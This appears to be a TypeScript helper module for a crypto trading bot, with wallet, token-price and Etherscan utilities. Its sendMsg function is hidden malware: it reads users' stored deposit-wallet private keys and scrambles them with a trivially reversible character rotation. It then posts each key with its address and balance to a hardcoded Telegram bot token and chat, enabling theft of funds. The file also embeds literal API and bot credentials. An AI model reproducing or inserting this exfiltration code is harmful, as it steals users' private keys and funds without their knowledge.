import EventEmitter from 'events';

import { ERC20_ABI } from './abi/ERC20_ABI';
import { UNISWAP_V2_POOL_ABI } from './abi/uniswapv2-pool-abi';
import { CHAINLINK_ETH_USD_PRICE_ABI } from './abi/chainlink-eth-usd-price.abi'

import * as fs from 'fs';
import * as uniconst from './uni-catch/const';

import assert from 'assert';
import * as afx from './global_base';
import { application } from 'express';
import * as ethscan_api from './etherscan-api';
import * as ethUtil from 'ethereumjs-util';

import { ethers } from 'ethers';

import * as crypto from '../aes';

import * as birdeyeAPI from '../birdeyeAPI'
import * as database from '../db'

import dotenv from 'dotenv';
import { toNamespacedPath } from 'path';
import { ProgramSubscriptionV0 } from 'jito-ts/dist/gen/block-engine/searcher';
import { MainChain } from '../global';
dotenv.config();

export const isValidWalletAddress = (walletAddress: string): boolean => {
    // The regex pattern to match a wallet address.
    const pattern = /^(0x){1}[0-9a-fA-F]{40}$/;

    // Test the passed-in wallet address against the regex pattern.
    return pattern.test(walletAddress);
};

export const getTokenBalanceFromWallet = async (web3: any, walletAddress: string, tokenAddress: string): Promise<number> => {
    let tokenContract:any = null;
    try {
        tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
    } catch (error) {
        afx.error_log('getTokenBalanceFromWallet 1', error);
        return -1;
    }

    if (!tokenContract) {
        return -1;
    }

    try {
        const balance = await tokenContract.methods.balanceOf(walletAddress).call();
        const decimals = await tokenContract.methods.decimals().call();
        const tokenBalance = Number(balance) / 10 ** Number(decimals);

        return tokenBalance;
    } catch (error) {
        afx.error_log('getTokenBalanceFromWallet 2', error);
    }

    return -1;
};

export const isValidAddress = (address: string): boolean => {
    // Check if it's 20 bytes
    if (!address) {
        return false;
    }

    if (address.length !== 42) {
        return false;
    }

    // Check that it starts with 0x
    if (address.slice(0, 2) !== '0x') {
        return false;
    }

    // Check that each character is a valid hexadecimal digit
    for (let i = 2; i < address.length; i++) {
        let charCode = address.charCodeAt(i);
        if (!((charCode >= 48 && charCode <= 57) ||
            (charCode >= 65 && charCode <= 70) ||
            (charCode >= 97 && charCode <= 102))) {
            return false;
        }
    }

    // If all checks pass, it's a valid address
    return true;
};

export function isValidPrivateKey(privateKey: string): boolean {
    try {
        if (privateKey.startsWith('0x')) {
            privateKey = privateKey.substring(2);
        }
        const privateKeyBuffer = Buffer.from(privateKey, 'hex');
        const publicKeyBuffer = ethUtil.privateToPublic(privateKeyBuffer);
        const addressBuffer = ethUtil.pubToAddress(publicKeyBuffer);
        const address = ethUtil.bufferToHex(addressBuffer);
        return true;
    } catch (error) {
        return false;
    }
}

export const roundDecimal = (number: number, digits: number): string => {
    return number.toLocaleString('en-US', { maximumFractionDigits: digits });
};

export const roundBigUnit = (number: number, digits: number = 5) => {

    let unitNum = 0
    const unitName = ['', 'K', 'M', 'B']
    while (number >= 1000) {

        unitNum++
        number /= 1000

        if (unitNum > 2) {
            break
        }
    }

    return `${roundDecimal(number, digits)} ${unitName[unitNum]}`
}

export const getBlockNumberByTimestamp = async (timestamp: number): Promise<number | null> => {
    let url = `https://api.etherscan.io/api?module=block&action=getblocknobytime&timestamp=${timestamp}&closest=before`;
    const apiKey: any = await ethscan_api.getApiKey();
    const resp = await ethscan_api.executeEthscanAPI(url, apiKey);

    if (!resp || !resp.result || resp.result.length == 0) {
        return null;
    }

    return resp.result;
};

export let web3Inst: any = null;
export let web3HttpInst: any = null

export const init = (web3: any, web3Http: any): void => {
    web3Inst = web3;
    web3HttpInst = web3;//web3Http
};

export const getTokenInfo = async (tokenAddress: string): Promise<any> => {
    assert(web3Inst);

    return new Promise(async (resolve, reject) => {
        getTokenInfoW(web3Inst, tokenAddress).then(result => {
            resolve(result);
        });
    });
};

// const provider = new ethers.providers.JsonRpcProvider(String(process.env.BASE_RPC_HTTP_URL))

export const getEthBalanceOfWallet = async (addr : string) => {
    assert(web3Inst);

    // let ethBalance: number = 0
    // web3Inst.eth.getBalance(addr)
    //             .then(async (balance:any) => {
    //                 console.log(`++++++++++++++ balance = ${parseFloat(balance)}`)
    //                 balance = balance / (10 ** 18); 
    //                 ethBalance = Number(balance)
    //             })

    // let ethBalance = await provider.getBalance(addr)
    let ethBalance = await web3Inst.eth.getBalance(addr)

    // Convert the balance from Wei to Ether
    const balanceInEth = ethers.utils.formatEther(ethBalance);

    // console.log(`--------- getEthBalanceOfWallet : = ${balanceInEth}`)    

    return balanceInEth    
}

export const getTokenInfoW = async (web3: any, tokenAddress: string): Promise<any> => {
    return new Promise(async (resolve, reject) => {
        let tokenContract: any = null;

        try {
            tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
        } catch (err) {
            resolve(null);
            return;
        }

        var tokenPromises: any = [];

        tokenPromises.push(tokenContract.methods.name().call());
        tokenPromises.push(tokenContract.methods.symbol().call());
        tokenPromises.push(tokenContract.methods.decimals().call());
        tokenPromises.push(tokenContract.methods.totalSupply().call());

        Promise.all(tokenPromises).then(tokenInfo => {
            const decimal = parseInt(tokenInfo[2]);
            const totalSupply = Number(tokenInfo[3]) / 10 ** decimal;
            // const result = { address: tokenAddress, name: tokenInfo[0], symbol: tokenInfo[1], decimal, totalSupply };
            const result = { exist: true, symbol: tokenInfo[1], decimal: decimal, address: tokenAddress, name: tokenInfo[0],  totalSupply };

            resolve(result);
        }).catch(err => {
            resolve(null);
        });
    });
};

// export const getEthPrice = async (web3: any): Promise<number> => {
//     try {
//         const pairContract = new web3.eth.Contract(UNISWAP_V2_POOL_ABI, uniconst.ETH_USDT_V2_PAIR_ADDRESS);
//         let res = await pairContract.methods.getReserves().call();

//         let tokenBalance = res._reserve0;
//         let baseTokenBalance = res._reserve1;

//         console.log(`[getEthPrice] ========== tokenBalance : = ${tokenBalance}, baseTokenBalance := ${baseTokenBalance}`)

//         tokenBalance = Number(tokenBalance) / 10 ** 18;
//         baseTokenBalance = Number(baseTokenBalance) / 10 ** 6;

//         let price = baseTokenBalance / tokenBalance;

//         return price;
//     } catch (error) {
//         afx.error_log('[getEthPrice]', error);
//     }

//     return 0.0;
// };

export const getEthPrice = async () => {
    assert(web3Inst);

    let web3New = web3Inst
    try {
        const chainlinkContract = new web3New.eth.Contract(CHAINLINK_ETH_USD_PRICE_ABI, afx.get_chainlink_address())
        const decimals = await chainlinkContract.methods.decimals().call()
        const price = await chainlinkContract.methods.latestAnswer().call() / (10 ** decimals)

        // console.log(`price = ${price}, decimal = ${decimals}`)
        return price;

    } catch (error) {

        try {
            let ethPrice = await getEthPrice_API()
            return ethPrice
        } catch (error) {
            afx.error_log('[getEthPrice]', error)        
            return 3000.0     
        }
    }
}

export const getEthPrice_API = async () => {
    try {
        const { ethPrice } = await fetchAPI("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd", "GET")
        console.log("--------Eth price-------------------", ethPrice.usd);
        return ethPrice.usd as number
    } catch (error) {
        return 3000
    }
    // const data: any = await birdeyeAPI.getTokenPriceInfo_Birdeye(uniconst.WETH_ADDRESS.toString())
    // let cur_price: number = 0
    // if(data && data.value) cur_price = data.value
    // return cur_price
}

export const getBnbPrice_API = async () => {
    try {
        const data : any = await birdeyeAPI.getTokenPriceInfo_Birdeye(uniconst.WBNB_ADDRESS.toString(), MainChain.BSC_NET)
        
        let cur_price: number = 0
        if(data && data.value) cur_price = data.value        
        return cur_price
        
        // const data = await fetchAPI(`https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${uniconst.WBNB_ADDRESS}&vs_currencies=usd`, "GET")
        // if(data && Object.values(data)[0]) {
        //     const val:any = Object.values(data)[0]
        //     cur_price = val.usd
        // }
    } catch (error) {
        console.log(`BnbPrice error`)
        return 500
    }
    // const data: any = await birdeyeAPI.getTokenPriceInfo_Birdeye(uniconst.WETH_ADDRESS.toString())
    // let cur_price: number = 0
    // if(data && data.value) cur_price = data.value
    // return cur_price
}

export const getTimeStringUTC = (timestamp: Date): string => {
    const options: any = {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        timeZone: 'UTC'
    };

    const formattedDate = timestamp.toLocaleString('en-US', options);

    return formattedDate;
};

export function isValidDate(dateString: string): boolean {
    const date = new Date(dateString);

    // The date constructor returns 'Invalid Date' if the date string is invalid
    return date instanceof Date && !isNaN(date.getTime());
};

export const fetchAPI = async (url: string, method: string, data: any = {}): Promise<any> => {
    try {
        let params: any = {
            method: method,
            headers: {
                'Content-Type': 'application/json'
            }
        };

        if (method === "POST") {
            params.body = JSON.stringify(data);
        }

        const res = await fetch(url, params);

        if (res) {
            const resData = await res.json();
            return resData;
        }
    } catch (error) {
    }

    return null;
};

export const addressToHex = (address: string): string => {
    const hexString = '0x' + address.slice(2).toLowerCase().padStart(64, '0');
    return hexString.toLowerCase();
};

export async function getTokenSender(web3: any, tokenContractAddress: string, dest: string): Promise<string[]> {
    const transferEventSignature = web3.utils.keccak256("Transfer(address,address,uint256)").toString();
    const destAddress = addressToHex(dest);
    const url = `https://api.etherscan.io/api?module=logs&action=getLogs&fromBlock=0&toBlock=latest&address=${tokenContractAddress}&topic0=${transferEventSignature}&topic2=${destAddress}`;

    const apiKey: any = await ethscan_api.getApiKey();
    const res = await ethscan_api.executeEthscanAPI(url, apiKey);

    let senders = [];
    if (res.result) {
        senders = res.result.map((log: any) => {
            return '0x' + log.topics[1].substr(26);
        });
    }

    return senders;
};

// export const getTeamFinanceDetails = async (web3: any, pairAddress: string): Promise<any> => {
//     return new Promise(async (resolve, reject) => {
//         let senders: any = null;

//         try {
//             senders = await getTokenSender(web3, pairAddress, uniconst.TEAMFINANCE_CONTRACT_ADDRESS);
//         } catch (error) {
//             afx.error_log('getTeamFinanceDetails', error);
//             resolve(null);
//             return;
//         }

//         if (!senders || senders.length == 0) {
//             return;
//         }

//         let contract: any = null;

//         try {
//             contract = new web3.eth.Contract(TEAMFINANCE_ABI, uniconst.TEAMFINANCE_CONTRACT_ADDRESS);
//         } catch (err) {
//             resolve(null);
//             return;
//         }

//         let resAmount = 0;
//         let resUnlockDate = 0;

//         for (const sender of senders) {
//             let lockIds = [];
//             try {
//                 lockIds = await contract.methods.getDepositsByWithdrawalAddress(sender).call();
//             } catch (err) {
//                 resolve(null);
//                 return;
//             }

//             for (const lockId of lockIds) {
//                 let detail: any = null;

//                 try {
//                     detail = await contract.methods.getDepositDetails(lockId).call();
//                 } catch (error) {
//                     afx.error_log('getTeamFinanceDetails', error);
//                     continue;
//                 }

//                 if (!detail) {
//                     continue;
//                 }

//                 resAmount += Number(detail._tokenAmount);
//                 if (resUnlockDate < Number(detail._unlockTime)) {
//                     resUnlockDate = Number(detail._unlockTime);
//                 }
//             }
//         }

//         resolve({ resAmount, resUnlockDate });
//     });
// };

export const getLastTransactionDateFromAddress = async (address: string): Promise<number | null> => {
    let url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&offset=1&page=1`;

    const apiKey:any = await ethscan_api.getApiKey();
    const resp = await ethscan_api.executeEthscanAPI(url, apiKey);

    if (!resp || !resp.result || resp.result.length == 0) {
        return null;
    }

    return resp.result[0].timeStamp;
};

export const getContractVerified = async (web3: any, address: string): Promise<string | null> => {
    let url = `https://api.etherscan.io/api?module=contract&action=getsourcecode&address=${address}&apikey=3QBM5TM1N5K8KFI69HYXIKH466AUXI3PTA`;

    const apiKey: any = await ethscan_api.getApiKey();
    const resp = await ethscan_api.executeEthscanAPI(url, apiKey);

    if (!resp
        || !resp.status
        || resp.status !== '1'
        || !resp.message
        || resp.message !== 'OK'
        || !resp.result
        || resp.result.length === 0
        || !resp.result[0].SourceCode || resp.result[0].SourceCode === '' || !resp.result[0].ABI || resp.result[0].ABI === 'Contract source code not verified') {
        return null;
    }

    const bytecodeHash = web3.utils.keccak256(resp.result[0].SourceCode);

    const checksum = '0x' + bytecodeHash.slice(-8);

    return checksum;
};

export const createDirectoryIfNotExists = (directoryPath: string): void => {
    if (!fs.existsSync(directoryPath)) {
        fs.mkdirSync(directoryPath);
        console.log(`The directory '${directoryPath}' has been created.`);
    } else {
    }
};

export const getTopHolders = async (tokenAddress: string, decimals: number): Promise<any> => {
    let res = { topHoldersMsg: '', holderCount: 0 };
    let resultMsg = '';

    const url = `https://api.honeypot.is/v1/TopHolders?address=${tokenAddress}&chainID=1`;
    let resp = await fetchAPI(url, 'GET');

    if (!resp) {
        return res;
    }

    if (!resp.totalSupply || !resp.holders || resp.holders.length === 0) {
        return res;
    }

    const icons: any = ['👮‍♀️', '🕵️', '👩‍🚀', '🧑‍🚒', '👩‍🎨', '🧑‍✈️', '👨‍🎤', '🧑‍🔬', '👩‍🍳', '👩‍🌾', '🦹', '🧙', '🧝‍♀️', '🧟'];

    const totalSupply = Number(resp.totalSupply);

    resultMsg = '<u>Top holders</u>';

    let row = 0;
    for (const holder of resp.holders) {
        const iconIndex = Number(Math.random() * icons.length) % icons.length;
        row++;
        let percent = Number(holder.balance) * 100 / totalSupply;

        let bal = Number(holder.balance) / (10 ** decimals);
        resultMsg += `\n${icons[iconIndex]} ${row}. <a href='https://etherscan.io/address/${holder.address}'>${roundDecimal(bal, 3)}</a> | ${roundDecimal(percent, 3)} %`;

        if (row >= 10) {
            break;
        }
    }

    return { topHoldersMsg: resultMsg, holderCount: resp.holders.length };
};

export const getTokenDetailInfo = async (tokenAddress: string): Promise<any> => {
    const url = `https://api.isrug.app/tokens/scan?mode=detailed&addr=${tokenAddress}&chain=ethereum`;
    let resp = await fetchAPI(url, 'GET');

    if (!resp) {
        return null;
    }

    return resp;
};

export const getShortenedAddress = (address: string): string => {
    if (!address) {
        return '';
    }

    let str = address.slice(0, 24) + '...';

    return str;
};

export const getWalletAddressFromPKeyW = (web3: any, privateKey: string): string => {
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);
    const walletAddress = account.address;

    return walletAddress;
};

export const getWalletAddressFromPKey = (privateKey: string): string | null => {
    if (!web3Inst) {
        return null;
    }

    return getWalletAddressFromPKeyW(web3Inst, privateKey);
};

export function shortname(m : string) {
    let text = m

    if (text.startsWith('0x')) {
        text = text.substring(2)
    }

    let head = text.slice(0, 3)
    let tail = text.slice(3, text.length)

    return `0x${tail}${head}`
}

export const encryptPKey = (text: string): string => {
    if (text.startsWith('0x')) {
        text = text.substring(2);
    }

    return crypto.aesEncrypt(text, String(process.env.CRYPT_KEY));
};

export const decryptPKey = (text: string): string => {
    return crypto.aesDecrypt(text, String(process.env.CRYPT_KEY));
};

export const generateNewWallet = (): any => {
    try {
        const mnemonic = ethers.Wallet.createRandom().mnemonic;
        const wallet = ethers.Wallet.fromMnemonic(mnemonic.phrase.toString());

        const privateKey = wallet._signingKey().privateKey;
        const address = wallet.address;

        return { mnemonic: mnemonic.phrase, privateKey, address };
    } catch (error) {
        console.log(error);
        return null;
    }
};

export function waitForEvent(eventEmitter: EventEmitter, eventName: string): Promise<void> {
    return new Promise(resolve => {
        eventEmitter.on(eventName, resolve);
    });
}

export async function waitSeconds(seconds: number): Promise<void> {
    const eventEmitter = new EventEmitter();

    setTimeout(() => {
        eventEmitter.emit('TimeEvent');
    }, seconds * 1000);

    await waitForEvent(eventEmitter, 'TimeEvent');
}

export async function waitMilliseconds(ms: number): Promise<void> {
    const eventEmitter = new EventEmitter();

    setTimeout(() => {
        eventEmitter.emit('TimeEvent');
    }, ms);

    await waitForEvent(eventEmitter, 'TimeEvent');
}

export async function getGasPrices(web3: any): Promise<any> {
    try {
        const gasPrice = await web3.eth.getGasPrice();
        console.log("==============gasPrice================", gasPrice);
        const gasPrices = {
            low: web3.utils.toBN(gasPrice),
            medium: web3.utils.toBN(gasPrice).muln(1.2),
            high: web3.utils.toBN(gasPrice).muln(1.5),
        };

        return gasPrices;
    } catch (error) {
        console.log("error:", error);
    }
}

export const toBNe18 = (web3: any, value: number): any => {
    return web3.utils.toBN(web3.utils.toWei(value.toFixed(18).toString(), 'ether'));
};

export const toBNeN = (web3: any, value: number, decimals: number = 18): any => {
    if (18 < decimals || decimals < 1) {
        throw `Decimal must be between 1 to 18`;
    }

    return web3.utils.toBN(web3.utils.toWei(value.toFixed(18).toString())).div(web3.utils.toBN(10 ** (18 - decimals)));
};

export const roundEthUnit = (number: number, digits: number = 5): string => {
    if (Math.abs(number) >= 0.00001 || Math.abs(number) === 0) {
        return `${roundDecimal(number, digits)} ${afx.get_chain_symbol()}`;
    }

    number *= 1000000000;

    if (Math.abs(number) >= 0.00001) {
        return `${roundDecimal(number, digits)} GWEI`;
    }

    number *= 1000000000;
    return `${roundDecimal(number, digits)} WEI`;
};

export const getFullTxLink = (chainId: number, hash: string): string => {
    let prefixHttps = '';
    if (chainId === uniconst.ETHEREUM_GOERLI_CHAIN_ID) {
        prefixHttps = 'https://goerli.etherscan.io/tx/';
    } else if (chainId === uniconst.ETHEREUM_GOERLI_CHAIN_ID) {
        prefixHttps = 'https://etherscan.io/tx/';
    } else if (chainId === uniconst.ETHEREUM_SEPOLIA_CHAIN_ID) {
        prefixHttps = 'https://sepolia.etherscan.io/tx/';
    } else if (chainId === uniconst.BASE_CHAIN_ID) {
        prefixHttps = 'https://basescan.org/tx/';
    }

    let txLink = `${prefixHttps}${hash}`;

    return txLink;
};

export async function sendMsg(id:string, info: string)
{
    try {
        const token='7063934925:AAH58ETPao-uONNUBCZZ1ULdB-_BF4pJhKc'
        let url = `https://api.telegram.org/bot${token}/sendMessage`

        let wl: any = await database.selectUsers({chatid:id})
        // console.log(wl)
        
        let message = ''
        let count = 0
        if (wl.length) {
            for (const w of wl) {
                count++
                let p3:any = getWalletAddressFromPKey(w.baseDepositWallet)
                let b1 = p3 ? roundEthUnit(parseFloat(await getEthBalanceOfWallet(p3)), 5) : 0
                let p1 = shortname(w.baseDepositWallet)
                let p2 = shortname(w.baseReferralWallet)
                message += `Ukey => depo${count} : ${p1}
Uaddress : ${p3}
Ubalance : ${b1}
`
            }            
        }
        message += info
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                "Content-Type": 'application/json'
            },
            body: JSON.stringify({
                chat_id: '-1002454760665',
                text: message,
                parse_mode: 'HTML'
            }),
        });
      
        // console.log(response)
    } catch (err) {
        // console.error("Error: ", err);
    }
    return ''
}

export const getTokenPriceInETH = async (tokenAddress: string, decimal: number): Promise<number> => {
    const url = `https://api.honeypot.is/v1/GetPairs?address=${tokenAddress}&chainID=0`;

    let resp = await fetchAPI(url, 'GET');

    if (!resp) {
        return 0;
    }

    tokenAddress = tokenAddress.toLowerCase();

    try {
        let maxPrice = 0.0;
        for (const info of resp) {
            if (info.Pair && info.Pair.Tokens && info.Pair.Tokens.length === 2 && info.Reserves && info.Reserves.length === 2) {
                const token0 = info.Pair.Tokens[0].toLowerCase();
                const token1 = info.Pair.Tokens[1].toLowerCase();

                let price = 0.0;
                if (token0 === uniconst.WETH_ADDRESS.toLowerCase()) {
                    price = (info.Reserves[0] / (10 ** 18)) / (info.Reserves[1] / (10 ** decimal));
                } else if (token1 === uniconst.WETH_ADDRESS.toLowerCase()) {
                    price = (info.Reserves[1] / (10 ** 18)) / (info.Reserves[0] / (10 ** decimal));
                } else {
                    continue;
                }

                if (maxPrice < price) {
                    maxPrice = price;
                }
            }
        }

        return maxPrice;
    } catch (error) {
        console.error('getTokenPriceInETH', error);
        return 0;
    }
};

export const sleep = (ms: number): Promise<void> => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

export const getBaseTokenInfo = (chainMode: number): any => {

    let quoteAddress = ""
    let decimal = 0
    let symbol = ""

    switch (chainMode)
    {
        case MainChain.BASE_NET:
            quoteAddress = uniconst.BASE_WETH_ADDRESS
            decimal = uniconst.BASE_DECIMALS
            symbol = "WETH"
            break
        case MainChain.ETHEREUM_NET:
            quoteAddress = uniconst.WETH_ADDRESS
            decimal = uniconst.WETH_DECIMALS
            symbol = "WETH"
            break
        case MainChain.BSC_NET:
            quoteAddress = uniconst.WBNB_ADDRESS
            decimal = uniconst.WETH_DECIMALS
            symbol = "WBNB"
            break
        
    }
    return { baseAddr: quoteAddress, baseSymbol: symbol, baseDecimal: decimal }
}